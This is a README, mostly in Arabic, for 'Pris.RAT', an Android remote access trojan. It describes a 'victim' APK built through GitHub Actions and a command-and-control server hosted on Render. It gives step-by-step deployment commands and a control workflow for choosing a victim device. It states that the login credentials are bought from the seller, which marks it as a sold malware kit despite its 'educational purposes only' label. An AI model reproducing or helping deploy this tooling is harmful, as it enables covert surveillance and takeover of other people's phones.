# Pris.RAT

**Pris Remote Access Tool** — أداة تحكم عن بعد للأجهزة الأندرويد.

## 📦 المكونات

| المكون | الوصف |
|--------|-------|
| `victim-apk/` | تطبيق الضحية (يُبنى عبر GitHub Actions) |
| `server/` | السيرفر C2 (يُنشر على Render) |
| `.github/workflows/` | GitHub Actions لبناء APK تلقائيًا |

## 🚀 خطوات التشغيل

### 1. نشر السيرفر
- اذهب إلى [Render.com](https://render.com)
- اربط بحساب GitHub
- اختر repo `Pris_RAT`
- Root Directory: `server`
- Build Command: `pip install -r requirements.txt`
- Start Command: `gunicorn --worker-class eventlet -w 1 server:app --bind 0.0.0.0:$PORT`
- Deploy → احصل على الرابط

### 2. بناء APK
- اذهب إلى تبويب **Actions** في GitHub
- اختر **Build APK**
- اضغط **Run workflow**
- انتظر 5-10 دقايق
- نزّل الـ APK من Artifacts

### 3. التحكم
- افتح رابط Render في المتصفح
- سجّل الدخول
- اختر جهاز → ابدأ التحكم

## 🔑 بيانات الدخول
- Username: `اشتره من البائع`
- Password: `اشتره من البائع`

## 📝 الترخيص
Private — for educational purposes only.